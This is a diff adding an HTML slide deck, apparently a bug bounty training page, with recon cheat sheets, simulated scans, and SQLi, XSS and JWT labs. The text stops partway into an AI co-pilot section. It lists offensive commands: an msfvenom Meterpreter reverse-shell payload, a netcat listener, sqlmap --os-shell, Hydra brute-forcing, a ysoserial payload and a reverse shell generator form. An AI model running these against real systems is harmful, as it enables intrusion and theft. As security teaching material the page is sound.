@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty Series 2026 — Complete Ethical Hacker Playbook</title>
+<style>
+:root{--accent:#ff3b3b;--accent2:#ff6b6b;--neon:#00f0ff;--neon2:#7b2dff;--dark:#0a0a0f;--card:#12121a;--border:#1e1e2e;--green:#27c93f;--yellow:#ffbd2e;}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--dark);color:#e0e0e0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;overflow-x:hidden}
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:var(--dark)}
+::-webkit-scrollbar-thumb{background:#333;border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--accent)}
+.slide{display:none;opacity:0;transition:opacity .5s ease;min-height:100vh}
+.slide.active{display:block;opacity:1}
+.bbs-header{display:flex;justify-content:space-between;align-items:center;padding:12px 24px;background:linear-gradient(90deg,rgba(255,59,59,.1),transparent);border-bottom:1px solid var(--border);position:fixed;top:0;left:0;right:0;z-index:100}
+.bbs-header .logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:14px;letter-spacing:2px;color:var(--accent)}
+.bbs-header .logo svg{width:28px;height:28px;flex-shrink:0}
+.bbs-header .slide-num{font-size:13px;color:#666;font-weight:600;letter-spacing:1px}
+.bbs-header .progress-bar{width:120px;height:4px;background:#1a1a2e;border-radius:2px;overflow:hidden}
+.bbs-header .progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:2px;transition:width .4s ease}
+.nav-dots{display:flex;gap:8px;justify-content:center;padding:16px;position:fixed;bottom:0;left:0;right:0;background:linear-gradient(transparent,var(--dark) 60%);z-index:90}
+.nav-dot{width:10px;height:10px;border-radius:50%;background:#333;border:2px solid #444;cursor:pointer;transition:all .3s}
+.nav-dot.active{background:var(--accent);border-color:var(--accent);box-shadow:0 0 10px var(--accent)}
+.nav-dot:hover{transform:scale(1.2)}
+.nav-arrows{position:fixed;bottom:20px;right:20px;display:flex;gap:8px;z-index:91}
+.nav-arrow{width:44px;height:44px;border-radius:50%;background:var(--card);border:1px solid var(--border);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;transition:all .3s}
+.nav-arrow:hover{background:var(--accent);border-color:var(--accent);transform:scale(1.1)}
+.nav-arrow:disabled{opacity:.3;cursor:not-allowed}
+h1{font-size:clamp(28px,5vw,52px);font-weight:900;line-height:1.1;letter-spacing:-1px}
+h2{font-size:clamp(20px,3vw,32px);font-weight:800;margin-bottom:16px}
+h3{font-size:18px;font-weight:700;color:var(--accent);margin-bottom:8px}
+.accent-text{color:var(--accent)}
+.neon-text{color:var(--neon);text-shadow:0 0 20px rgba(0,240,255,.3)}
+.green-text{color:var(--green)}
+.yellow-text{color:var(--yellow)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:24px;margin-bottom:16px;transition:all .3s}
+.card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 8px 32px rgba(255,59,59,.1)}
+.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px}
+.card-grid-3{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:8px;border:none;font-weight:700;font-size:14px;cursor:pointer;transition:all .3s;text-transform:uppercase;letter-spacing:1px}
+.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,59,59,.4)}
+.btn-outline{background:transparent;border:1px solid var(--border);color:#fff}
+.btn-outline:hover{border-color:var(--neon);color:var(--neon)}
+.btn-sm{padding:8px 16px;font-size:12px}
+.tag{display:inline-block;padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;background:rgba(255,59,59,.1);color:var(--accent);border:1px solid rgba(255,59,59,.3)}
+.terminal{background:#0d0d15;border:1px solid #1a1a2e;border-radius:12px;overflow:hidden;font-family:'Courier New',monospace}
+.terminal-header{display:flex;align-items:center;gap:8px;padding:10px 16px;background:#12121a;border-bottom:1px solid #1a1a2e}
+.terminal-dot{width:12px;height:12px;border-radius:50%}
+.terminal-dot.red{background:#ff5f56}
+.terminal-dot.yellow{background:#ffbd2e}
+.terminal-dot.green{background:#27c93f}
+.terminal-body{padding:16px;font-size:13px;line-height:1.8;color:#a0a0b0;overflow-y:auto;max-height:400px}
+.terminal-body .cmd{color:var(--neon)}
+.terminal-body .output{color:#888}
+.terminal-body .success{color:var(--green)}
+.terminal-body .warning{color:var(--yellow)}
+.terminal-body .error{color:#ff5f56}
+.module-box{background:linear-gradient(135deg,rgba(255,59,59,.05),rgba(123,45,255,.05));border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px}
+.module-title{display:flex;align-items:center;gap:10px;font-size:16px;font-weight:700;margin-bottom:12px}
+.module-title .icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--neon2));display:flex;align-items:center;justify-content:center;font-size:18px}
+.input-field,.select-field{width:100%;padding:12px 16px;background:#0d0d15;border:1px solid #1a1a2e;border-radius:8px;color:#fff;font-family:inherit;font-size:14px;transition:all .3s;margin-bottom:8px}
+.input-field:focus,.select-field:focus{outline:none;border-color:var(--neon);box-shadow:0 0 0 3px rgba(0,240,255,.1)}
+textarea.input-field{resize:vertical;min-height:80px}
+@keyframes scan{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
+.scan-line{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--neon),transparent);opacity:.3;pointer-events:none;z-index:50;animation:scan 4s linear infinite}
+.grid-bg{background-image:linear-gradient(rgba(255,59,59,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,59,59,.03) 1px,transparent 1px);background-size:40px 40px}
+.code-block{background:#0d0d15;border:1px solid #1a1a2e;border-radius:8px;padding:16px;font-family:'Courier New',monospace;font-size:13px;line-height:1.8;color:#888;overflow-x:auto;max-height:300px;overflow-y:auto}
+.toast{position:fixed;top:20px;right:20px;padding:12px 20px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:14px;font-weight:600;z-index:200;transform:translateX(400px);transition:transform .3s ease}
+.toast.show{transform:translateX(0)}
+.tab-bar{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
+.tab-btn{padding:8px 16px;border-radius:8px;background:#0d0d15;border:1px solid #1a1a2e;color:#888;cursor:pointer;font-size:13px;font-weight:600;transition:all .3s}
+.tab-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.tab-btn:hover:not(.active){border-color:var(--neon);color:var(--neon)}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+.cheat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:16px}
+.cheat-item{padding:12px;background:#0d0d15;border-radius:8px;border-left:3px solid var(--accent)}
+.cheat-item .cmd-text{font-family:'Courier New',monospace;font-size:13px;color:var(--neon);margin-bottom:4px;word-break:break-all}
+.cheat-item .desc{font-size:12px;color:#666}
+@media(max-width:768px){.card-grid,.card-grid-3{grid-template-columns:1fr}.nav-arrows{bottom:70px}}
+</style>
+</head>
+<body>
+<div class="scan-line"></div>
+<div class="slide active" id="slide-1">
+<div class="grid-bg" style="min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:100px 20px 60px;">
+<div class="tag" style="margin-bottom:24px">BUG BOUNTY SERIES 2026</div>
+<h1 style="margin-bottom:16px">THE <span class="accent-text">COMPLETE</span><br>ETHICAL HACKER<br>PLAYBOOK</h1>
+<p style="font-size:18px;color:#888;max-width:600px;margin-bottom:40px;line-height:1.6">From reconnaissance to reward — master the art of ethical hacking with AI-powered workflows, hands-on simulations, and real-world methodologies.</p>
+<div class="card-grid" style="max-width:900px;width:100%;margin-bottom:40px">
+<div class="card" style="text-align:left"><div style="font-size:32px;margin-bottom:8px">&#128269;</div><h3>RECONNAISSANCE</h3><p style="font-size:14px;color:#888">Map the attack surface with advanced OSINT techniques and automated discovery tools.</p></div>
+<div class="card" style="text-align:left"><div style="font-size:32px;margin-bottom:8px">&#127919;</div><h3>VULNERABILITY</h3><p style="font-size:14px;color:#888">Identify, validate, and exploit security weaknesses using proven methodologies.</p></div>
+<div class="card" style="text-align:left"><div style="font-size:32px;margin-bottom:8px">&#129302;</div><h3>AI CO-PILOT</h3><p style="font-size:14px;color:#888">Leverage LLMs and PentestGPT to accelerate analysis, payload creation, and reporting.</p></div>
+<div class="card" style="text-align:left"><div style="font-size:32px;margin-bottom:8px">&#128165;</div><h3>METASPLOIT</h3><p style="font-size:14px;color:#888">Generate payloads, build handlers, and explore 12 critical CVE exploits.</p></div>
+<div class="card" style="text-align:left"><div style="font-size:32px;margin-bottom:8px">&#128176;</div><h3>REWARD</h3><p style="font-size:14px;color:#888">Document findings professionally and maximize bounty payouts with polished reports.</p></div>
+</div>
+<button class="btn btn-primary" onclick="goToSlide(2)">BEGIN THE JOURNEY &#8594;</button>
+</div>
+</div>
+<div class="slide" id="slide-2">
+<div style="max-width:1200px;margin:0 auto;padding:80px 20px 120px">
+<div class="tag" style="margin-bottom:16px">MODULE 01 — RECONNAISSANCE &amp; INFORMATION GATHERING</div>
+<h1 style="margin-bottom:8px">1. THE <span class="accent-text">ART OF</span><br>MAPPING TARGETS</h1>
+<p style="color:#888;margin-bottom:32px;max-width:600px">Every successful pentest begins with thorough reconnaissance. Know your target before you strike.</p>
+<div class="card-grid">
+<div class="card">
+<h3>&#127758; PASSIVE RECON</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Gather intelligence without touching the target. OSINT, WHOIS, DNS records, social media.</p>
+<div class="terminal" style="margin-bottom:12px">
+<div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span style="font-size:11px;color:#666;margin-left:8px">osint.sh</span></div>
+<div class="terminal-body" id="recon-terminal" style="max-height:250px">
+<span class="cmd">$ whois example.com</span><br>
+<span class="output">Registrar: NameCheap, Inc.<br>Created: 2015-03-12<br>Nameservers: ns1.example.com<br>Admin Email: admin@example.com</span><br><br>
+<span class="cmd">$ dig +short example.com</span><br>
+<span class="output">93.184.216.34</span><br><br>
+<span class="cmd">$ theHarvester -d example.com -b all</span><br>
+<span class="output" id="harvester-output">[*] Searching Google...<br>[*] Found 47 emails<br>[*] Found 12 subdomains<br>[*] Searching LinkedIn...<br>[*] Found 8 employees<br>[*] Searching Shodan...<br>[!] Found 2 exposed services</span>
+</div>
+</div>
+<button class="btn btn-outline" style="width:100%" onclick="runRecon()">&#9654; RUN RECON SIMULATION</button>
+</div>
+<div class="card">
+<h3>&#128294; ACTIVE RECON</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Port scanning, service enumeration, and vulnerability fingerprinting with Nmap and Nikto.</p>
+<div class="terminal" style="margin-bottom:12px">
+<div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span style="font-size:11px;color:#666;margin-left:8px">nmap-scan.sh</span></div>
+<div class="terminal-body" id="nmap-terminal" style="max-height:250px">
+<span class="cmd">$ nmap -sV -sC -O target.com</span><br>
+<span class="output">Starting Nmap 7.94...</span><br>
+<span class="output">PORT     STATE SERVICE  VERSION</span><br>
+<span class="output">22/tcp   open  ssh      OpenSSH 8.9</span><br>
+<span class="output">80/tcp   open  http     Apache 2.4.41</span><br>
+<span class="output">443/tcp  open  ssl/http nginx 1.18.0</span><br>
+<span class="output">3306/tcp open  mysql    MySQL 8.0.32</span><br>
+<span class="warning" id="nmap-warn">[!] MySQL exposed to internet — HIGH RISK</span>
+</div>
+</div>
+<button class="btn btn-outline" style="width:100%" onclick="runNmap()">&#9654; RUN NMAP SIMULATION</button>
+</div>
+<div class="card">
+<h3>&#128225; SUBDOMAIN ENUMERATOR</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Discover hidden subdomains with brute-force, certificate transparency, and permutation attacks.</p>
+<div class="module-box">
+<div style="margin-bottom:12px">
+<label style="font-size:12px;color:#888;display:block;margin-bottom:6px">TARGET DOMAIN</label>
+<input type="text" class="input-field" id="subdomain-target" value="example.com" placeholder="Enter target domain...">
+</div>
+<div style="display:flex;gap:8px;margin-bottom:12px">
+<button class="btn btn-primary btn-sm" style="flex:1" onclick="enumSubdomains()">ENUMERATE</button>
+<button class="btn btn-outline btn-sm" style="flex:1" onclick="clearSubdomains()">CLEAR</button>
+</div>
+<div id="subdomain-results" class="code-block" style="min-height:120px;max-height:200px">
+<span style="color:#555">// Results will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#127760; WHOIS LOOKUP</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Query domain registration details, registrar info, and DNS records.</p>
+<div class="module-box">
+<div style="display:flex;gap:8px;margin-bottom:12px">
+<input type="text" class="input-field" id="whois-domain" value="example.com" placeholder="Enter domain..." style="flex:1">
+<button class="btn btn-primary btn-sm" onclick="runWhois()">LOOKUP</button>
+</div>
+<div id="whois-results" class="code-block" style="min-height:150px">
+<span style="color:#555">// WHOIS data will appear here...</span>
+</div>
+</div>
+</div>
+</div>
+<div class="card" style="margin-top:16px">
+<h3>&#128295; COMPLETE RECONNAISSANCE COMMAND CHEAT SHEET</h3>
+<div class="tab-bar">
+<button class="tab-btn active" onclick="showTab(this,'tab-nmap')">Nmap</button>
+<button class="tab-btn" onclick="showTab(this,'tab-dns')">DNS</button>
+<button class="tab-btn" onclick="showTab(this,'tab-web')">Web</button>
+<button class="tab-btn" onclick="showTab(this,'tab-osint')">OSINT</button>
+<button class="tab-btn" onclick="showTab(this,'tab-ssl')">SSL</button>
+</div>
+<div id="tab-nmap" class="tab-panel active">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">nmap -sV -sC target.com</div><div class="desc">Version detection + default scripts</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap -p- target.com</div><div class="desc">Scan all 65535 ports</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap -T4 -A target.com</div><div class="desc">Aggressive scan (OS + version + traceroute)</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap --script vuln target.com</div><div class="desc">Vulnerability scan with NSE scripts</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap -sn 192.168.1.0/24</div><div class="desc">Host discovery (ping sweep)</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap -sV --script=banner target.com</div><div class="desc">Grab service banners</div></div>
+</div>
+</div>
+<div id="tab-dns" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">dig +short example.com</div><div class="desc">Get A record (IP address)</div></div>
+<div class="cheat-item"><div class="cmd-text">dig MX example.com</div><div class="desc">Get mail server records</div></div>
+<div class="cheat-item"><div class="cmd-text">dig ANY example.com</div><div class="desc">Get all DNS records</div></div>
+<div class="cheat-item"><div class="cmd-text">dig +short -x 192.168.1.1</div><div class="desc">Reverse DNS lookup</div></div>
+<div class="cheat-item"><div class="cmd-text">fierce --domain example.com</div><div class="desc">DNS enumeration with Fierce</div></div>
+</div>
+</div>
+<div id="tab-web" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">nikto -h target.com</div><div class="desc">Web server vulnerability scan</div></div>
+<div class="cheat-item"><div class="cmd-text">gobuster dir -u target.com -w common.txt</div><div class="desc">Directory brute-forcing</div></div>
+<div class="cheat-item"><div class="cmd-text">whatweb target.com</div><div class="desc">Identify web technologies</div></div>
+<div class="cheat-item"><div class="cmd-text">wpscan --url target.com</div><div class="desc">WordPress vulnerability scan</div></div>
+<div class="cheat-item"><div class="cmd-text">ffuf -u http://target.com/FUZZ -w wordlist.txt</div><div class="desc">Fast web fuzzer</div></div>
+</div>
+</div>
+<div id="tab-osint" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">theHarvester -d example.com -b all</div><div class="desc">Email &amp; subdomain discovery</div></div>
+<div class="cheat-item"><div class="cmd-text">amass enum -d example.com</div><div class="desc">In-depth DNS enumeration</div></div>
+<div class="cheat-item"><div class="cmd-text">sublist3r -d example.com</div><div class="desc">Fast subdomain enumeration</div></div>
+<div class="cheat-item"><div class="cmd-text">shodan host 192.168.1.1</div><div class="desc">Shodan host lookup</div></div>
+<div class="cheat-item"><div class="cmd-text">waybackurls example.com</div><div class="desc">Get Wayback Machine URLs</div></div>
+</div>
+</div>
+<div id="tab-ssl" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">sslscan target.com:443</div><div class="desc">SSL/TLS configuration scan</div></div>
+<div class="cheat-item"><div class="cmd-text">testssl.sh target.com</div><div class="desc">Comprehensive SSL/TLS testing</div></div>
+<div class="cheat-item"><div class="cmd-text">nmap --script ssl-enum-ciphers -p 443 target.com</div><div class="desc">Enumerate SSL ciphers</div></div>
+<div class="cheat-item"><div class="cmd-text">openssl s_client -connect target.com:443</div><div class="desc">Check SSL certificate</div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="slide" id="slide-3">
+<div style="max-width:1200px;margin:0 auto;padding:80px 20px 120px">
+<div class="tag" style="margin-bottom:16px">MODULE 02 — VULNERABILITY DISCOVERY &amp; EXPLOITATION TOOLS</div>
+<h1 style="margin-bottom:8px">2. FINDING THE <span class="accent-text">WEAKNESS</span></h1>
+<p style="color:#888;margin-bottom:32px;max-width:600px">Systematically identify, validate, and exploit security vulnerabilities across the attack surface.</p>
+<div class="card-grid">
+<div class="card">
+<h3>&#127919; OWASP TOP 10 (2026)</h3>
+<p style="font-size:14px;color:#888;margin-bottom:16px">The most critical web application security risks. Click each to learn detection techniques.</p>
+<div id="owasp-list">
+<div class="module-box" style="cursor:pointer;padding:12px 16px;margin-bottom:8px" onclick="toggleOwasp(this)">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<span><strong style="color:var(--accent)">A01</strong> — Broken Access Control</span><span style="color:#666">&#9660;</span>
+</div>
+<div class="owasp-detail" style="display:none;margin-top:12px;padding-top:12px;border-top:1px solid #1a1a2e;font-size:13px;color:#888">
+<strong>Detection:</strong> Test IDOR vulnerabilities by manipulating object references. Check for missing auth on admin endpoints. Try horizontal/vertical privilege escalation.<br><br>
+<strong>Tools:</strong> Burp Suite Repeater, Autorize extension, JWT_Tool<br><br>
+<strong>Commands:</strong><br>
+<code style="background:#0d0d15;padding:2px 6px;border-radius:4px;color:var(--neon);font-size:12px">curl -H "Cookie: session=admin" http://target.com/admin</code>
+</div>
+</div>
+<div class="module-box" style="cursor:pointer;padding:12px 16px;margin-bottom:8px" onclick="toggleOwasp(this)">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<span><strong style="color:var(--accent)">A02</strong> — Cryptographic Failures</span><span style="color:#666">&#9660;</span>
+</div>
+<div class="owasp-detail" style="display:none;margin-top:12px;padding-top:12px;border-top:1px solid #1a1a2e;font-size:13px;color:#888">
+<strong>Detection:</strong> Check for plaintext data transmission, weak encryption algorithms (MD5/SHA1), missing TLS, hardcoded secrets in source code.<br><br>
+<strong>Tools:</strong> SSL Labs, GitLeaks, TruffleHog
+</div>
+</div>
+<div class="module-box" style="cursor:pointer;padding:12px 16px;margin-bottom:8px" onclick="toggleOwasp(this)">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<span><strong style="color:var(--accent)">A03</strong> — Injection (SQLi, XSS, Command)</span><span style="color:#666">&#9660;</span>
+</div>
+<div class="owasp-detail" style="display:none;margin-top:12px;padding-top:12px;border-top:1px solid #1a1a2e;font-size:13px;color:#888">
+<strong>Detection:</strong> Fuzz all input vectors with special characters. Test SQLi with <code>' OR '1'='1</code>, time-based payloads. Test XSS with &lt;script&gt;alert(1)&lt;/script&gt;.<br><br>
+<strong>Tools:</strong> SQLMap, XSSer, Commix, Burp Intruder
+</div>
+</div>
+<div class="module-box" style="cursor:pointer;padding:12px 16px;margin-bottom:8px" onclick="toggleOwasp(this)">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<span><strong style="color:var(--accent)">A05</strong> — Security Misconfiguration</span><span style="color:#666">&#9660;</span>
+</div>
+<div class="owasp-detail" style="display:none;margin-top:12px;padding-top:12px;border-top:1px solid #1a1a2e;font-size:13px;color:#888">
+<strong>Detection:</strong> Check for default credentials, exposed .env files, directory listing enabled, verbose error messages, unnecessary features enabled.<br><br>
+<strong>Tools:</strong> Nikto, Nuclei, Dirb, Gobuster
+</div>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#129514; SQL INJECTION LAB</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Interactive SQLi simulator. Test payloads against a simulated login query.</p>
+<div class="module-box">
+<div style="margin-bottom:12px">
+<label style="font-size:12px;color:#888;display:block;margin-bottom:6px">USERNAME</label>
+<input type="text" class="input-field" id="sqli-user" value="admin' OR '1'='1" placeholder="Enter username...">
+</div>
+<div style="margin-bottom:12px">
+<label style="font-size:12px;color:#888;display:block;margin-bottom:6px">PASSWORD</label>
+<input type="text" class="input-field" id="sqli-pass" value="anything" placeholder="Enter password...">
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:12px" onclick="testSQLi()">&#9654; EXECUTE QUERY</button>
+<div id="sqli-result" class="code-block" style="min-height:80px">
+<span style="color:#555">// Query results will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#128373; XSS DETECTOR</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Test Cross-Site Scripting payloads and see how they execute in a browser context.</p>
+<div class="module-box">
+<div style="margin-bottom:12px">
+<label style="font-size:12px;color:#888;display:block;margin-bottom:6px">PAYLOAD</label>
+<select class="select-field" id="xss-payload" style="margin-bottom:8px">
+<option value="<script>alert('XSS')</script>">&lt;script&gt;alert('XSS')&lt;/script&gt;</option>
+<option value="<img src=x onerror=alert('XSS')>">&lt;img src=x onerror=alert('XSS')&gt;</option>
+<option value="javascript:alert('XSS')">javascript:alert('XSS')</option>
+<option value="<svg onload=alert('XSS')>">&lt;svg onload=alert('XSS')&gt;</option>
+<option value="<iframe src=javascript:alert('XSS')>">&lt;iframe src=javascript:alert('XSS')&gt;</option>
+</select>
+<input type="text" class="input-field" id="xss-custom" placeholder="Or enter custom payload...">
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:12px" onclick="testXSS()">&#9654; TEST PAYLOAD</button>
+<div id="xss-result" class="code-block" style="min-height:80px">
+<span style="color:#555">// XSS analysis will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#128273; JWT DECODER / ANALYZER</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Decode and analyze JSON Web Tokens. View header, payload, and signature.</p>
+<div class="module-box">
+<div style="margin-bottom:12px">
+<label style="font-size:12px;color:#888;display:block;margin-bottom:6px">JWT TOKEN</label>
+<textarea class="input-field" id="jwt-token" rows="3" placeholder="Paste JWT token here (eyJhbGciOiJIUzI1NiIs...)">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2ODAwMDAwMDB9.signature</textarea>
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:12px" onclick="decodeJWT()">&#9654; DECODE TOKEN</button>
+<div id="jwt-result" class="code-block" style="min-height:120px">
+<span style="color:#555">// Decoded JWT will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#128418; REVERSE SHELL GENERATOR</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Generate reverse shell payloads for various platforms and languages.</p>
+<div class="module-box">
+<div style="display:flex;gap:8px;margin-bottom:12px">
+<select class="select-field" id="shell-type" style="flex:1">
+<option value="bash">Bash</option>
+<option value="python">Python</option>
+<option value="nc">Netcat</option>
+<option value="php">PHP</option>
+<option value="ruby">Ruby</option>
+<option value="powershell">PowerShell</option>
+</select>
+<input type="text" class="input-field" id="shell-ip" value="10.10.14.5" placeholder="IP" style="width:120px">
+<input type="text" class="input-field" id="shell-port" value="4444" placeholder="Port" style="width:70px">
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:12px" onclick="generateShell()">&#9654; GENERATE PAYLOAD</button>
+<div id="shell-result" class="code-block" style="min-height:60px">
+<span style="color:#555">// Payload will appear here...</span>
+</div>
+</div>
+</div>
+</div>
+<div class="card" style="margin-top:16px">
+<h3>&#128295; EXPLOITATION &amp; VULNERABILITY COMMANDS</h3>
+<div class="tab-bar">
+<button class="tab-btn active" onclick="showTab(this,'tab-sqli')">SQLMap</button>
+<button class="tab-btn" onclick="showTab(this,'tab-xss-cmd')">XSS</button>
+<button class="tab-btn" onclick="showTab(this,'tab-ssi')">Server-Side</button>
+<button class="tab-btn" onclick="showTab(this,'tab-misc')">Misc</button>
+</div>
+<div id="tab-sqli" class="tab-panel active">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">sqlmap -u "http://target.com/page.php?id=1"</div><div class="desc">Basic SQLMap scan on GET parameter</div></div>
+<div class="cheat-item"><div class="cmd-text">sqlmap -u "http://target.com/page.php?id=1" --dbs</div><div class="desc">Enumerate databases</div></div>
+<div class="cheat-item"><div class="cmd-text">sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump</div><div class="desc">Dump table contents</div></div>
+<div class="cheat-item"><div class="cmd-text">sqlmap -u "http://target.com/page.php?id=1" --os-shell</div><div class="desc">Get OS shell (if possible)</div></div>
+<div class="cheat-item"><div class="cmd-text">sqlmap -u "http://target.com/page.php?id=1" --batch --level=5 --risk=3</div><div class="desc">Aggressive scan (all options)</div></div>
+<div class="cheat-item"><div class="cmd-text">sqlmap -r request.txt --batch</div><div class="desc">Scan from Burp request file</div></div>
+</div>
+</div>
+<div id="tab-xss-cmd" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">xsser -u "http://target.com/search?q="</div><div class="desc">XSSer automated scan</div></div>
+<div class="cheat-item"><div class="cmd-text">dalfox url http://target.com/page?param=value</div><div class="desc">Dalfox XSS scanner</div></div>
+<div class="cheat-item"><div class="cmd-text">xsstrike -u "http://target.com/search?q=test"</div><div class="desc">XSStrike advanced XSS detection</div></div>
+</div>
+</div>
+<div id="tab-ssi" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">ffuf -u http://target.com/FUZZ -w common.txt</div><div class="desc">Directory discovery</div></div>
+<div class="cheat-item"><div class="cmd-text">commix -u "http://target.com/cmd.php" --data="cmd="</div><div class="desc">Command injection scanner</div></div>
+<div class="cheat-item"><div class="cmd-text">ysoserial CommonsCollections1 'touch /tmp/pwned'</div><div class="desc">Java deserialization payload</div></div>
+</div>
+</div>
+<div id="tab-misc" class="tab-panel">
+<div class="cheat-grid">
+<div class="cheat-item"><div class="cmd-text">hydra -l admin -P passwords.txt ssh://target.com</div><div class="desc">SSH brute-force with Hydra</div></div>
+<div class="cheat-item"><div class="cmd-text">john --wordlist=passwords.txt hash.txt</div><div class="desc">Password cracking with John</div></div>
+<div class="cheat-item"><div class="cmd-text">hashcat -m 0 hash.txt wordlist.txt</div><div class="desc">GPU-accelerated hash cracking</div></div>
+<div class="cheat-item"><div class="cmd-text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe</div><div class="desc">Generate Meterpreter payload</div></div>
+<div class="cheat-item"><div class="cmd-text">nc -lvnp 4444</div><div class="desc">Netcat listener for reverse shell</div></div>
+<div class="cheat-item"><div class="cmd-text">python3 -m http.server 80</div><div class="desc">Quick Python HTTP server</div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="slide" id="slide-4">
+<div style="max-width:1200px;margin:0 auto;padding:80px 20px 120px">
+<div class="tag" style="margin-bottom:16px">MODULE 03 — AI CO-PILOT &amp; METASPLOIT FRAMEWORK</div>
+<h1 style="margin-bottom:8px">3. THE <span class="accent-text">CO-PILOT</span><br>&amp; METASPLOIT ARSENAL</h1>
+<p style="color:#888;margin-bottom:32px;max-width:600px">AI accelerates your workflow. Metasploit delivers the payload. Your criteria earns the reward.</p>
+<div class="card-grid">
+<div class="card" style="grid-column:span 2">
+<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:20px" class="card-grid-3">
+<div class="module-box" style="text-align:center"><div style="font-size:28px;margin-bottom:8px">&#128269;</div><div style="font-weight:700;font-size:13px">ANALYZE FASTER</div></div>
+<div class="module-box" style="text-align:center"><div style="font-size:28px;margin-bottom:8px">&#127919;</div><div style="font-weight:700;font-size:13px">DESIGN ATTACKS</div></div>
+<div class="module-box" style="text-align:center"><div style="font-size:28px;margin-bottom:8px">&#128165;</div><div style="font-weight:700;font-size:13px">DEPLOY EXPLOITS</div></div>
+<div class="module-box" style="text-align:center"><div style="font-size:28px;margin-bottom:8px">&#128221;</div><div style="font-weight:700;font-size:13px">GENERATE REPORTS</div></div>
+</div>
+</div>
+<div class="card">
+<div class="module-title"><div class="icon">&#129302;</div><span>PENTESTGPT SIMULATOR</span></div>
+<p style="font-size:13px;color:#888;margin-bottom:12px">YOUR PENTESTING ASSISTANT</p>
+<p style="font-size:14px;color:#a0a0b0;margin-bottom:16px">Helps you build attack chains, understand complex concepts, and generate professional reports.</p>
+<div class="terminal" style="margin-bottom:12px">
